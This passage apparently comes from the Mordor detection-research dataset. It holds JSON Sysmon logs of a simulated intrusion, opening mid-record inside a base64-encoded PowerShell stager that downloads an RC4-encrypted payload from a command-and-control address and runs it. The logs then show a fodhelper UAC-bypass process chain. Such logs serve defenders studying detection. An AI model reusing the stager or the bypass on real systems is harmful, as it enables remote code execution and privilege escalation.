AZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","Keywords":-9223372036854775808,"CurrentDirectory":"C:\\windows\\system32\\","CommandLine":"\"C:\\windows\\system32\\fodhelper.exe\" ","IntegrityLevel":"Medium","AccountName":"SYSTEM","EventID":1,"FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","ParentProcessId":"1376","ProcessId":"5224","ProcessGuid":"{3ddc5665-ed05-5f51-ed02-000000000500}","Description":"Features On Demand Helper","Hashes":"SHA1=98551F5184691B65DCEBA531C4E4975D77CD25A5,MD5=7215C73EC1AAE35B9E4B1F22C811F85C,SHA256=7E80DA8D839DCF05E30317256460ED7A4EE25CAB2750D768569AAAB35E1E8C64,IMPHASH=2BD851C90720C3E5FEE7E3FF3ACFA3D5","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","AccountType":"User","ParentProcessGuid":"{3ddc5665-e80d-5f51-2501-000000000500}","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","Company":"Microsoft Corporation","ThreadID":4344,"RecordNumber":309689,"SeverityValue":2,"SourceModuleName":"eventlog","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Severity":"INFO","OriginalFileName":"FodHelper.EXE","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process Create (rule: ProcessCreate)","EventReceivedTime":"2020-09-04 03:30:13","Task":1,"UtcTime":"2020-09-04 07:30:13.250","EventTime":"2020-09-04 03:30:13","LogonGuid":"{3ddc5665-e7e4-5f51-2d99-0a0000000000}","@timestamp":"2020-09-04T07:30:13.845Z","User":"THESHIRE\\pgustavo","tags":["mordorDataset"],"LogonId":"0xa992d","RuleName":"-","Image":"C:\\Windows\\System32\\fodhelper.exe"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:13.245\r\nSourceProcessGUID: {3ddc5665-e80d-5f51-2501-000000000500}\r\nSourceProcessId: 1376\r\nSourceThreadId: 344\r\nSourceImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetProcessGUID: {3ddc5665-ed05-5f51-ed02-000000000500}\r\nTargetProcessId: 5224\r\nTargetImage: C:\\windows\\system32\\fodhelper.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9d8e4|C:\\windows\\System32\\KERNELBASE.dll+5f2ea|C:\\windows\\System32\\KERNELBASE.dll+5bc86|C:\\windows\\System32\\KERNEL32.DLL+1be93|C:\\windows\\System32\\windows.storage.dll+d350e|C:\\windows\\System32\\windows.storage.dll+d3d23|C:\\windows\\System32\\windows.storage.dll+d3350|C:\\windows\\System32\\windows.storage.dll+d21f7|C:\\windows\\System32\\windows.storage.dll+d4c5d|C:\\windows\\System32\\windows.storage.dll+19bf68|C:\\windows\\System32\\windows.storage.dll+ce651|C:\\windows\\System32\\windows.storage.dll+19d229|C:\\windows\\System32\\shell32.dll+3bb12|C:\\windows\\System32\\shell32.dll+3a285|C:\\windows\\System32\\shell32.dll+36dd3|C:\\windows\\System32\\shell32.dll+374ab|C:\\windows\\System32\\shell32.dll+3721d|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e5ca2506c5609c721348b1ed0a2fb5af\\System.ni.dll+38b3fc|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e5ca2506c5609c721348b1ed0a2fb5af\\System.ni.dll+2d41f2|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+58df12|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+58dd95|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+58dd65|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+633e85|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll+6923","SourceThreadId":"344","TargetImage":"C:\\windows\\system32\\fodhelper.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-ed05-5f51-ed02-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e80d-5f51-2501-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"1376","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"5224","AccountType":"User","SourceImage":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309690,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1fffff","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9d8e4|C:\\windows\\System32\\KERNELBASE.dll+5f2ea|C:\\windows\\System32\\KERNELBASE.dll+5bc86|C:\\windows\\System32\\KERNEL32.DLL+1be93|C:\\windows\\System32\\windows.storage.dll+d350e|C:\\windows\\System32\\windows.storage.dll+d3d23|C:\\windows\\System32\\windows.storage.dll+d3350|C:\\windows\\System32\\windows.storage.dll+d21f7|C:\\windows\\System32\\windows.storage.dll+d4c5d|C:\\windows\\System32\\windows.storage.dll+19bf68|C:\\windows\\System32\\windows.storage.dll+ce651|C:\\windows\\System32\\windows.storage.dll+19d229|C:\\windows\\System32\\shell32.dll+3bb12|C:\\windows\\System32\\shell32.dll+3a285|C:\\windows\\System32\\shell32.dll+36dd3|C:\\windows\\System32\\shell32.dll+374ab|C:\\windows\\System32\\shell32.dll+3721d|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e5ca2506c5609c721348b1ed0a2fb5af\\System.ni.dll+38b3fc|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\e5ca2506c5609c721348b1ed0a2fb5af\\System.ni.dll+2d41f2|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+58df12|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+58dd95|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+58dd65|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\828ccaa50bf1ef868f4ecc1cf23f7dff\\mscorlib.ni.dll+633e85|C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll+6923","Task":10,"UtcTime":"2020-09-04 07:30:13.245","EventTime":"2020-09-04 03:30:13","EventReceivedTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.845Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"1376"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:30:13.245\r\nSourceProcessGUID: {3ddc5665-e7df-5f51-7a00-000000000500}\r\nSourceProcessId: 4996\r\nSourceThreadId: 5032\r\nSourceImage: C:\\windows\\system32\\csrss.exe\r\nTargetProcessGUID: {3ddc5665-ed05-5f51-ed02-000000000500}\r\nTargetProcessId: 5224\r\nTargetImage: C:\\windows\\system32\\fodhelper.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\system32\\basesrv.DLL+2fba|C:\\windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce5f","SourceThreadId":"5032","TargetImage":"C:\\windows\\system32\\fodhelper.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-ed05-5f51-ed02-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7df-5f51-7a00-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"4996","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"5224","AccountType":"User","SourceImage":"C:\\windows\\system32\\csrss.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309691,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1fffff","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\system32\\basesrv.DLL+2fba|C:\\windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce5f","Task":10,"UtcTime":"2020-09-04 07:30:13.245","EventTime":"2020-09-04 03:30:13","EventReceivedTime":"2020-09-04 03:30:13","@timestamp":"2020-09-04T07:30:13.845Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"4996"}
